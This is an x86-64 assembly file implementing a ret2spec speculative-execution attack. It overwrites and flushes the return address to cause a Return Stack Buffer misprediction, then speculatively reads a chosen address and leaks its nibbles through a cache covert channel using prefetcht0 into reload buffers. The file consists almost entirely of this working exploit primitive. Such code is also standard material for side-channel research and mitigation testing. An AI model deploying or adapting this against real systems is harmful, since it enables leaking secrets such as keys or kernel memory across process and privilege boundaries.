.global ret2spec
.global ret2spec_end

.text

rsb_mispredict:
  movq $ret2spec_end, (%rsp)

  // Flush (%rsp) so noticing the wrong return
  // value will take a very long time, giving us
  // a long speculative window
  clflush (%rsp)
  mfence

  ret

// rdi: leak address
// rsi: nibble 0 of reload buffer
// rdx: nibble 1 of reload buffer
ret2spec:
  pushq %rbp
  movq %rsp, %rbp

  // This call actually modifies its return pointer to be at
  // ret2spec_end, so the instructions between the call and
  // the ret2spec_end label are never executed (except speculatively)
  call rsb_mispredict

  xor %rax, %rax
  xor %rcx, %rcx

  // Leak the value at (%rdi)
  //movq $0x42, %rax
  movq (%rdi), %rax
  movq %rax, %rcx
  andq $0x0f, %rcx
  andq $0xf0, %rax
  shl $0x8, %rax
  shl $0xc, %rcx
  prefetcht0 (%rdx, %rax)
  prefetcht0 (%rsi, %rcx)
  mfence

  // Do the mask and subtracting thing to make sure we
  // actually leak the thing
  //andq %r8, %rax
  //subq %r9, %rax
  //ror $48, %rax

  // Covert channel for the leaked value
  // These two instructions are never actually executed, but are speculatively
  // executed. They have a side effect on the cache
  // shl $0xc, %rax
  // prefetcht0 (%rsi, %rax)
  // mfence

loop:
  pause
  jmp loop


ret2spec_end:
  movq %rbp, %rsp
  popq %rbp
  ret
  
